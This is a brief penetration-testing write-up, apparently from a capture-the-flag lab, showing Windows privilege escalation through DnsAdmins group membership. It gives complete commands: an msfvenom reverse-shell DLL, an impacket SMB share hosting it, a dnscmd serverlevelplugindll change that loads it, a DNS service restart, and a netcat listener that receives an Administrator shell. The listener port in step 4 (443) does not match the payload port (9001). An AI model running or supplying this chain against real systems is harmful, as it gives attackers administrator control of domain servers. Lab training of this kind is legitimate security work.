
As member of the DnsAdmin Group, we can execute dnscmd.exe command with external DLL plugin file via ryan account for Priv Esc.

1. Now we need to prepare a DLL that will be supplied as the serverlevelplugindll. We can use msfvenom for this.

```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.57 LPORT=9001 -f dll > raw.dll
```

2. Transfer the .dll file onto the target server.

WARNING: Has to be impacket-smbclient transfer.
```
impacket-smbserver share $(pwd)
```

3. Configure DNS Service to use the plugin.dll as the serverlevelplugin.dll

```
cmd /c 'dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.14.57\share\raw.dll'
```

4. Started up netcat listener on local machine.

```
rlwrap nc -lvnp 443
```

5. Restart DNS Service.

```
sc.exe stop dns
sc.exe start dns
```

Gained RCE as Administrator.

```
rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.54.249] 49906
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```